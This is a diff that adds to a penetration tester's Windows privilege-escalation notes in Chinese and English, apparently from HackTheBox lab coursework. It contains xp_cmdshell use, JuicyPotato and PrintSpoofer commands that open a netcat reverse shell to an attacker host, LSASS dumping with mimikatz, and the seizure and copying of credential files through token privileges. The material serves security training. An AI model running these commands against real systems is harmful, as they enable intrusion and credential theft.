@@ -24,6 +24,7 @@ https://learn.microsoft.com/en-us/powershell/module/applocker/get-applockerpolic
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 
 tasklist /svc
+tasklist | findstr /c:"2156"
 
 set            查看、设置或删除“环境变量”（Environment Variables）
 
@@ -47,6 +48,52 @@ net accounts
 
 进程之间相互通信的另一种方式是通过命名管道 (Named Pipes)
 
+https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist            枚举管道
 
+pipelist.exe /accepteula
+gci \\.\pipe\
+accesschk.exe /accepteula \\.\Pipe\lsass -v            查看LSASS权限
+accesschk.exe -w \pipe\* -v             搜索所有允许写入访问的管道
 
+https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e
+https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt
+
+mssqlclient.py sql_dev@10.129.43.30 -windows-auth
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami
+SQL> xp_cmdshell whoami /priv
+
+***SeImpersonatePrivilege
+  首先下载 JuicyPotato.exe 二进制文件，并将其和 nc.exe 上传到目标服务器            https://github.com/ohpe/juicy-potato      利用 SeImpersonate 或 SeAssignPrimaryToken 特权
+  sudo nc -lnvp 8443
+  SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
+    OR      xp_cmdshell c:\tools\PrintSpoofer.exe -c "C:\tools\nc.exe PWNIP PWNPO -e cmd.exe"
+
+https://github.com/itm4n/PrintSpoofer            https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
+https://github.com/antonioCoco/RoguePotato
+
+***SeDebugPrivilege
+  https://learn.microsoft.com/en-us/sysinternals/downloads/procdump
+  OR      Task Manager 对 LSASS 进程 Create dump file
+  mimikatz.exe
+  log
+  sekurlsa::minidump lsass.dmp
+  sekurlsa::minidump lsass.dmp
   
+  https://github.com/decoder-it/psgetsystem
+
+***SeTakeOwnershipPrivilege
+  未经客户事先同意，我们不应更改重要文件的所有权，例如线上环境的 web.config 文件。此外，更改深埋在多个子目录下的文件的所有权（同时一路更改每个子目录的权限）可能难以恢复，应予以避免。
+
+  C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
+    https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown
+
+  C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}      查看所有权
+
+  icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F      修改ACL
+
+***SeBackupPrivilege
+  Set-SeBackupPrivilege
+  Get-SeBackupPrivilege
+  Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Creds.txt' .\Creds.txt
+
